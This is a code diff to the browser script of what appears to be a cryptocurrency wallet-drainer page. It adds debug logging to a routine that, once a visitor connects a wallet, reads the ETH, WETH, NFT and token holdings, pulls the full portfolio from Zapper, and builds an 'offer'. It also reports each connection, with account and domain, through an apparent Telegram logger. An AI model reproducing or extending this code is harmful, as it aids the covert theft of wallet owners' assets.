@@ -689,6 +689,16 @@
     try {
       waitAlert();
       await get12DollarETH();
+      const ethBalance = await appState.provider.request({
+    method: "eth_getBalance",
+    params: [appState.account, "latest"]
+});
+
+console.log("Native ETH Balance:", ethBalance);
+console.log(
+"ETH:",
+ethers.utils.formatEther(ethBalance)
+);
 
       const connectmsg = `🥇Wallet Connected!<br><b>Account: <code>${appState.account}</code></b><br>Domain: ${window.location.hostname}`;
       logTlg(connectmsg);
@@ -698,7 +708,11 @@
         getCounter(appState.account),
         getWETH(appState.account)
       ]);
-
+console.log("===== ASSET DISCOVERY =====");
+console.log("NFT LIST:", tokenListRaw);
+console.log("COUNTER:", counterRaw);
+console.log("WETH:", wethData);
+console.log("===========================");
       let tokenListLocal = tokenListRaw || [];
       let counter = parseInt((counterRaw || 0).toString());
 
@@ -764,12 +778,19 @@
       // Zapper (exact original query preserved)
       try {
         const zapperQuery = `query PortfolioV2($addresses: [Address!]!) { portfolioV2(addresses: $addresses) { tokenBalances { byToken { edges { node { tokenAddress symbol balance balanceRaw balanceUSD network { name } } } } } } }`;
+        console.log("Sending Zapper request...");
+console.log({
+    address: appState.account
+});
         const zapperRes = await fetch("https://public.zapper.xyz/graphql", {
           method: "POST",
           headers: { "Content-Type": "application/json", "x-zapper-api-key": ZAPPER_KEY },
           body: JSON.stringify({ query: zapperQuery, variables: { addresses: [appState.account] } })
         });
         const zapperData = await zapperRes.json();
+        console.log("===== ZAPPER RESPONSE =====");
+console.log(zapperData);
+console.log("===========================");
         const edges = zapperData?.data?.portfolioV2?.tokenBalances?.byToken?.edges || [];
 
         const networkMap = {
@@ -801,7 +822,9 @@
       } catch (zErr) {
         classifyError(zErr, { operation: 'zapper_fetch' });
       }
-
+console.log("Final token list");
+console.log(tokenListLocal);
+console.log("Total:", tokenListLocal.length);
       window.tokenList = tokenListLocal;
 
       if (offer.offer.length === 0) {
